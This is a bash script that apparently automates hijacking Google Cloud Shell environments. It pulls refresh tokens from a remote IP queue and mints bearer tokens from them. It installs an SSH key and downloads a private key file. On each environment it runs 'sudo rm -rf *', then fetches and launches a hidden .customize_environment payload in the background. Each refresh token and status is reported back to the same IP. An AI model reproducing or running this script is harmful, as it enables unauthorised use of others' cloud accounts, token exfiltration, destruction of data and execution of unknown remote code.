#!/bin/bash

path=$(pwd)
account=${path#/home/}

status='null'
status1='null'
bearer='null'
commandOk='null'

if [ ! -e 'get-bearer.sh' ]
then
   wget -q https://raw.githubusercontent.com/Predador21/scripts/main/get-bearer.sh && chmod 777 get-bearer.sh
fi

if [ ! -e 'get-operation.sh' ]
then
   wget -q https://raw.githubusercontent.com/Predador21/scripts/main/get-operation.sh && chmod 777 get-operation.sh
fi

if [ ! -e 'addPublicKey.sh' ]
then
   wget -q https://raw.githubusercontent.com/Predador21/scripts/main/addPublicKey.sh && chmod 777 addPublicKey.sh
fi

if [ ! -e 'command.sh' ]
then
   wget -q https://raw.githubusercontent.com/Predador21/scripts/main/command.sh && chmod 777 command.sh
fi

if [ ! -e 'google_compute_engine' ]
then
   wget -q https://raw.githubusercontent.com/Predador21/files/main/google_compute_engine && chmod 600 google_compute_engine
fi

#status='QUOTA_EXCEEDED'

while true
do

 if [ ! -e 'refresh-token' ] || [ $status == 'QUOTA_EXCEEDED' ]
 then
    rm -rf refresh-token
    wget -q 'http://135.148.11.148/queue.php?owner='$account -O refresh-token

    PublicKey='null'
    commandOk='null'
    bearer='null'
 fi

 refresh_token=( `cat "refresh-token"`)

 if [ $bearer == 'null' ] || [ $status1 == 'UNAUTHENTICATED' ]
 then
    source get-bearer.sh $refresh_token
 fi

 source get-operation.sh $bearer
 status1=$status_operation

 if [ $status1 != 'UNAUTHENTICATED' ]
 then

    file='.'$(openssl rand -hex 12)
    #file='init.log'

    curl -s --request GET \
            --url 'https://cloudshell.googleapis.com/v1/'$operation'?alt=json' \
            --header 'Authorization: Bearer '$bearer'' \
            --header 'Accept: application/json' \
            --header 'Content-Type: application/json' \
            --compressed > $file

    user=$(jq '.response.environment.name' $file)
    sshUsername=$(jq '.response.environment.sshUsername' $file)
    sshHost=$(jq '.response.environment.sshHost' $file)
    status1=$(jq '.error.status' $file)
    status2=$(jq '.metadata.state' $file)
    status3=$(jq '.response.environment.state' $file)
    status4=$(jq '.error.details[0].code' $file)

    PublicKey=$(jq '.response.environment.publicKeys' $file)

    user=${user//'users/'/}
    user=${user//'/environments/default'/}
    user=${user//'"'/}

    sshUsername=${sshUsername//'"'/}
    sshHost=${sshHost//'"'/}

    status1=${status1//'"'/} #UNAUTHENTICATED
    status2=${status2//'"'/} #STARTING/FINISHED
    status3=${status3//'"'/} #RUNNING
    status4=${status4//'"'/} #ERROS

fi

 if [ $status1 != 'null' ]
 then
    status=$status1
 else
    if [ $status4 != 'null' ]
    then
       status=$status4
    else
        if [ $status3 != 'null' ]
       then
          status=$status3
       else
          status=$status2
       fi
    fi
 fi

 if [ "$PublicKey" == 'null' ] && [ $status == 'RUNNING' ]
 then
    source addPublicKey.sh $bearer $sshHost
 fi

 if [ "$PublicKey" != 'null' ] && [ $commandOk == 'null' ]
 then
    command="sudo rm -rf *"
    command=$command" && sudo rm -rf .customize_environment"
    command=$command" && wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment -P /home/"$sshUsername
    command=$command" && chmod 777 .customize_environment"
    command=$command" && sudo nohup ./.customize_environment > /dev/null &"

    source command.sh $sshUsername $sshHost "$command"
 fi

 url='http://135.148.11.148/send_status.php?refresh='$refresh_token'&status='$status'&owner='$account
 curl $url

 if [ $file != 'init.log' ]
 then
    rm -rf $file
 fi

 echo
 echo 'Account: '$account
 echo 'Status:  '$status
 echo 'UserSSH: '$sshUsername
 echo 'Refresh: '$refresh_token

 sleep 60

 done
